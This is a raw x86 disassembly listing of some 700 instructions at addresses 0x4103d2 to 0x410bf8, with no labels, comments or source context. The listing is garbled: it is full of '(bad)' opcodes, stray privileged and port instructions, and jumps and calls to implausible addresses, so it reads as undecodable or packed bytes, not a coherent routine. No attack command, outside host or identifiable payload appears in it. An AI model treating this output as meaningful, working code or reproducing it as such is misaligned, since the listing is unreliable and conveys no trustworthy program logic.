  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
